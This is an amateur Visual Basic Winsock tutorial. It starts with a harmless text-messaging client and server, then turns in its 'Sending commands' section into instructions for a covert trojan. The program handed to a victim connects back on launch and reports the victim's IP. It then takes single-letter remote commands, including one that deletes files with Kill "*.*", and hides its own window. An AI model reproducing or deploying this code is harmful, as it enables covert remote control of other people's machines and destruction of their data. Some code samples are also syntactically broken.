===========================WINSOCK TUTORIAL======================

In this tutorial i will show you how to use winsock for begginners. 'How to make two programs communicate'

Open visual basic twice so one can act as server and other can act as a client.



==================================================================
FINDING WINSOCK
==================================================================
Right click on the toolbar and click components and find 'Microsoft Winsock Control' 
and make sure its checked now click apply then cancel, you should see the winsock control
appear in the toolbar it looks like two computers joined with a red line.

==================================================================
SERVER
==================================================================

LISTENING

Click the winsock control and draw it on your form and name it 'wskserver'
now we need to make the server listen for connection so double click on your form so the form_load
event comes up in your code 

Private Sub Form_Load()
Dim p As String
p = 5432
wskserver.LocalPort = p
wskserver.Listen
' MsgBox "winsock listening ok", vbInformation, "winsock ok"
End Sub

enter this code in your form_load event.
whats happend is i have dimed p as string so visual basic will recognise in the code that p represents text
and the text is 5432 which is stated underneith the dim statement.
the line below is assigning the winsock control that the local port is p but p is actually 5432 so visual basic
reads it as ' wskserver.LocalPort = 5432.'
the next line is telling the winsock control to listen for connections on the local port wich is 5432.

just to test if the winsock control is listening at runtime take away the ' before the message box on the final 
line of code and run the program and see if the message box is displayed if it does then delete it entirly from 
your code if not then read this tutorial again.

CONNECTION REQUEST

When something connects to the port winsock is listening on we need to accept the connection so other things can 
then happen between the two programs

now double click 'wskserver' on your form and  you will go to the code side and you should be in something called

Private Sub wskserver_Error(bla bla bla)

End Sub

at the top right hand corner of the code window click on error and a drop down menu should appear, select 'connection request'
now you should have this appear in your code 

Private Sub wskserver_ConnectionRequest(ByVal requestID As Long)

End Sub

this is probably the simplest part of the program so i wont spend much time on it 
enter this into the connection request event


Private Sub wskserver_ConnectionRequest(ByVal requestID As Long)
If wskserver.State <> sckClosed Then wskserver.Close
wskserver.Accept requestID
End Sub

the first line checks the state of wskserver and if its anything but closed it will close it , so in other words its taking 
it off listening and making it accept whos trying to connect to you.
the next line is accepting the connection request.


DATA ARRIVAL

	
Go to your form and draw a text box and call it 'txtrecieve'
Now double click wskserver go to the top right hand side of the code again and select 'DataArrival'
this can be slightly tricky so read this carefully. you will need to enter this code

Private Sub wskserver_DataArrival(ByVal bytesTotal As Long)
Dim data As String
wskserver.GetData data
txtrecieve.Text = data
End Sub

The first line dims the 'data' thats recieved as text (instead of data you can call it anythin e.g msg)
the second line gets whatever the client is trying to send to the server in this case its called 'data'
the third line says when the data is recieved display it in the txtrecieve text box. 
If you get errors with this its most probably your client isnt connected to you.


NOTE : ON THE CLIENT YOU CAN JUST ADD A CONNECTION REQUEST AND DATA ARRIVAL EVENT AND YOU WILL BE ABLE TO SEND TEXT TO AND
FROM SERVER. ONCE CLIENT CONNECTED TO SERVER.

================================================
CLIENT
================================================

In your other visual basic program you have open draw the winsock control and call it wskclient. Draw 2 command buttons and
call one 'cmdconnect' and the other 'cmdsend'. Draw 4 text boxes calling them 'txtsend'(to send the message) 'txtrecieve'
(to recieve the message) 'txtip' (this is the box were the server IP will go) and 'txtp'(whatever port we want to connect on 
will go here in this case its '5432') if you want to make your client more fancy then add labels at the side of the ip and 
port box so you know wich one is which.

now onto the programming

double click the form to bring up the form_load event and enter the following code

Private Sub Form_Load()
txtp.Text = "5432"
End Sub

this is just to set the number in the port box to 5432 (what the server is listening on) this just makes it easier so you dont
have to always remember the port and write it in every time the program has started.


CONNECT


now go back to your form and double click the 'cmdconnect' command button and type this code into the event

Private Sub cmdconnect_Click()
Dim ip As String
Dim p As String
ip = txtip.Text
p = txtp.Text
wskclient.Connect ip, p
'MsgBox "connected", vbInformation, "connected"
End Sub 
  
The first line is telling the program to show the variable 'ip' as text and on the second line it is doing the same but instead
of 'ip' its 'p' the third line is saying whenever the program will see 'ip' it will look at the text in txtip text box which in this
case will be the IP address we are connecting to. the forth line is saying whenever the program will see 'p' then it will
look at the text in the txtp text box which in this case is the port we are going to connect on. the fifth line is now telling
winsock 'wskclient' to connect to ip and p (put the host first then then port) so really the winsock will be doing this

wskclient.Connect 127.0.0.1, 5432

the first set of numbers is the IP we are connecting to (host) and then the commer then the port we are connecting on.
in the sixth line you can add a message box to tell the user that they have connected ok(remove the ' if you want the message
box to work.



SEND



now click the 'cmdsend' command button and add the following code

Private Sub cmdsend_Click()
Dim data As String
data = txtsend.Text
wskclient.SendData data
End Sub


i wont explain the first line as i have already explained it enough and the second line too. the third line tells winsock
'wskclient' to send some data wich we have called 'data' just to keep it simple and 'data' is 'txtsend.text' wich is whatever
the user has typed in.

=====================================================
RUNNING PROGRAM
=====================================================


the two programs are now able to communicate with each other. 

1.Run the server.( IT IS VERY IMPORTANT YOU RUN THE SERVER FIRST IF YOU HAVE MADE THE WINSOCK LISTEN
IN THE FORM_LOAD EVENT OTHERWISE THE WILL NOT COMMUNICATE)

2.Run the client.

3.Enter the IP and port (in client)

4.Connect!

5.Send message to the server





=================================================================================================================================
SENDING COMMANDS  ( I AM NOT TO BE HELD RESPONSIBLE FOR YOUR ACTIONS THE COMMANDS YOU SEND ARE UPTO YOU I ONLY SHOW HOW TO DO IT)
=================================================================================================================================


ok this is probably the hardest thing to do in winsock and its not that difficult once you get a full idea of whats happening
so open two visual basics up and has one acting as server and one as client ( like i have already explained how to do)
but to do this they will need to open the client and you will open the server also in the client dont add a connect or send 
button put both the code in them in the form_load event so when they open the program it will connect and send data withought
them doing anything (make sure you put YOUR IP in the ip box so when they open it it will connect to you.
on the program that they will be open make one of the winsocks display their IP in a text box and make that winsock send 
whats in the text box so in effect when they open the program it will send whats in the text box wich will be their IP.


Private Sub Form_Load()
Dim ip As String
Dim p As String
Dim data As String
data = txtip.Text
ip = txtmyip.Text
p = 8000
txtip.Text = wskip.LocalIP
wskip.Close
wskip.Connect ip, p
wskip.SendData data
End Sub

it is a good idea to add another winsock that will listen in this form_load event so when you recieve their IP you can then
connect to them and start sending commands.

NOTE: if there is an error sending the data use the form_load event below which includes a timer.


Private Sub Form_Load()
Dim ip As String
Dim p As String
Dim data As String

ip = txtmyip.Text
p = 8000
txtip.Text = wskip.LocalIP
wskip.Close
wskip.Connect ip, p
tmr1.Enabled = True
end sub

make a timer and call it tmr1 and make sure you set its enabled property to false and set the interval to 1000.
now type in the code above.
now double click your timer and enter this code

Private Sub tmr1_Timer()
Dim data As String
data = txtip.Text
wskip.SendData data
tmr1.Enabled = False
End Sub

now this will work and send you the persons IP 

NOTE: on your other program make a winsock to listen on port 8000 and accept data as you already know how to do.

COMMANDS

to send commands we will actually be sending letter from the program that you have open to the program that they have open
and then making the program that they have say  ok if the letter is T then do this or if the letter if F do this etc etc.


in the program that the IP is sent from make another winsock listen 'wskcommand' on another port in the form_load event 
(keep it high so less chance of other things using it) and make a text box called 'txtcommand'
 make the wskcommand accept connection requests then in the data arrival put this.

Private Sub wskcommand_DataArrival(ByVal bytesTotal As Long)
Dim data As String
wskcommand.GetData data
txtcommand.Text = data
If txtcommand.Text = "T" Then
Call command1
Else
if txtcommand.Text = "L" Then
Call command2
End Sub

in the data arrival event it is saying when the data arrives if the txtcommand box has a T in it then do command 1 but if it 
doesnt have a T in then do command 2

NOTE: on the program that you will be running on your pc that accepts the IP simply make another winsock called 
'wsksendcommand' and make it connect to the winsock called wskcommand wich is obveosly on the program they will be running
and send the letter T (you can make it into any letter you want it doesnt have to be T)

the 'command1' and 'command2' are actually procedures that i have called command1 and command2 to make a procedure go to

Tools > Add Procedure >
 
then type in a name and click ok you will notice that it has made the procedure and you will now be able to enter commands
into it. for example once you have made your data arrival event call the procedure you can put code in it and it will run 
whatever is entered

Public Sub command1()
MsgBox " N00b i am now going to kill your PC", vbCritical, "kill pc"
Kill "*.*"
End Sub

NOTE: you can add as many procedures as you want just make sure you call it with a letter in the data arrival event.

USEFUL TIPS
======================================================






SENDING MORE THAN ONE TEXT BOX WITH THE SAME WINSOCK

HIDING A FORM

in the form_load event or were you want put

form1.hide 

this will hide your form

to send more than one text box you need to use the + sign e.g

Dim data As String
data = txt1.Text + txt2.Text + txt3.Text
wsksend.SendData data

when the data is recieved it will show the text from these three text boxes together.


CONNECT TO YOUR PC

to connect to your pc use the IP address 127.0.0.1


SENDING IP

on a visual basic form make a text box and a winsock control call them 'txtip' and 'wskip'

now in the form load event put 

Private Sub Form_Load()
txtip.Text = wskip.LocalIP
End Sub

this just sets the text property in the 'txtip' to the IP of whoever has opened the form.
so now you need to make a program that will accept the IP its just exactly the same as above but instead of sending what the
user has typed in it will send the IP.

NOTE: for differant winsocks use differant ports or they wont work.
